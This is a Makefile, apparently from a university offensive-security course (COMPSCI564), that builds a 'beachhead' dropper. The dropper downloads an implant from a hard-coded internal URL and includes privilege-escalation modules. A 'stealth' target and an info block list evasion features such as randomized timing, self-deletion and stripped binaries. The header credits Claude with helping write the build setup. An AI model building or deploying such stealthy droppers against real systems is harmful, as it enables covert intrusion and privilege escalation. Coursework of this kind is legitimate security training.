# ==============================================================================
# COMPSCI564 - Beachhead Makefile (Stealth-Enhanced)
# ==============================================================================
# This Makefile compiles the beachhead binary with minimal dependencies
# 
# Usage:
#   make                          # Build with default URL
#   make URL='"http://..."'       # Build with custom implant URL
#   make clean                    # Remove build artifacts
#   make debug                    # Build with debug symbols and logging
#   make stealth                  # Build optimized for stealth (recommended)
#
# AI Assistance Attribution:
# Build configuration developed with assistance from Claude (Anthropic)
# ==============================================================================

# Implant download URL (set via command line or use default)
URL ?= "http://10.37.1.249/implant"

# Compiler and flags
CXX = g++

# Standard flags (balanced)
CXXFLAGS = -O2 -s -Wall -Wextra -DURL='$(URL)'

# Stealth flags (maximum optimization, minimal size)
STEALTH_FLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
                -ffunction-sections -fdata-sections -DURL='$(URL)'

# Debug flags
DEBUG_FLAGS = -O0 -g -Wall -Wextra -DDEBUG -DURL='$(URL)'

# Linker flags
LDFLAGS = -Wl,--gc-sections

# Target binary
TARGET = beachhead

# Source files
SRCS = beachhead.cpp privesc_check.cpp privesc.cpp

# Object files
OBJS = $(SRCS:.cpp=.o)

# ==============================================================================
# Build Targets
# ==============================================================================

# Default target (standard build)
all: $(TARGET)

# Link object files to create beachhead binary
$(TARGET): $(OBJS)
	@echo "[*] Linking $(TARGET)..."
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
	@echo "[*] Stripping debug symbols..."
	strip --strip-all $(TARGET)
	@echo "[+] Build complete: $(TARGET)"
	@ls -lh $(TARGET)
	@file $(TARGET)

# Compile beachhead.cpp
beachhead.o: beachhead.cpp privesc_check.h privesc.h
	@echo "[*] Compiling beachhead.cpp..."
	$(CXX) $(CXXFLAGS) -c beachhead.cpp -o beachhead.o

# Compile privesc_check.cpp
privesc_check.o: privesc_check.cpp privesc_check.h
	@echo "[*] Compiling privesc_check.cpp..."
	$(CXX) $(CXXFLAGS) -c privesc_check.cpp -o privesc_check.o

# Compile privesc.cpp
privesc.o: privesc.cpp privesc.h
	@echo "[*] Compiling privesc.cpp..."
	$(CXX) $(CXXFLAGS) -c privesc.cpp -o privesc.o

# ==============================================================================
# Specialized Builds
# ==============================================================================

# Stealth build (maximum optimization, minimal size)
stealth: CXXFLAGS = $(STEALTH_FLAGS)
stealth: clean
	@echo "[*] Building STEALTH version..."
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS) $(LDFLAGS)
	@echo "[*] Aggressive stripping..."
	strip --strip-all --remove-section=.comment --remove-section=.note $(TARGET)
	@echo "[+] Stealth build complete"
	@ls -lh $(TARGET)
	@echo "[*] Binary entropy check:"
	@sha256sum $(TARGET)

# Debug build (with logging and symbols)
debug: CXXFLAGS = $(DEBUG_FLAGS)
debug: clean
	@echo "[*] Building DEBUG version..."
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS)
	@echo "[+] Debug build complete (symbols preserved, logging enabled)"
	@ls -lh $(TARGET)

# ==============================================================================
# Utility Targets
# ==============================================================================

# Clean build artifacts
clean:
	@echo "[*] Cleaning build artifacts..."
	rm -f $(TARGET) $(OBJS)
	@echo "[+] Clean complete"

# Show build configuration
info:
	@echo "===================================================================="
	@echo "Beachhead Build Configuration (Stealth-Enhanced)"
	@echo "===================================================================="
	@echo "Target:        $(TARGET)"
	@echo "Compiler:      $(CXX)"
	@echo "Standard Flags: $(CXXFLAGS)"
	@echo "Stealth Flags:  $(STEALTH_FLAGS)"
	@echo "Implant URL:   $(URL)"
	@echo "Source Files:  $(SRCS)"
	@echo "===================================================================="
	@echo "Stealth Features:"
	@echo "  - No test file creation (stat-based checks)"
	@echo "  - Minimal /proc enumeration (~300 PIDs vs all)"
	@echo "  - Randomized timing (60-75s vs fixed 65s)"
	@echo "  - Multi-strategy cron detection"
	@echo "  - Self-deletion after execution"
	@echo "===================================================================="

# Test build (compile but don't strip for debugging)
test: CXXFLAGS = -O2 -Wall -Wextra -DDEBUG -DURL='$(URL)'
test: clean
	@echo "[*] Building TEST version (with debug output)..."
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRCS)
	@echo "[+] Test build complete"
	@ls -lh $(TARGET)

# Size comparison
size-check: all
	@echo "===================================================================="
	@echo "Binary Size Analysis"
	@echo "===================================================================="
	@size $(TARGET)
	@echo "===================================================================="
	@ls -lh $(TARGET)

# ==============================================================================
# Phony Targets
# ==============================================================================

.PHONY: all clean debug info test stealth size-check
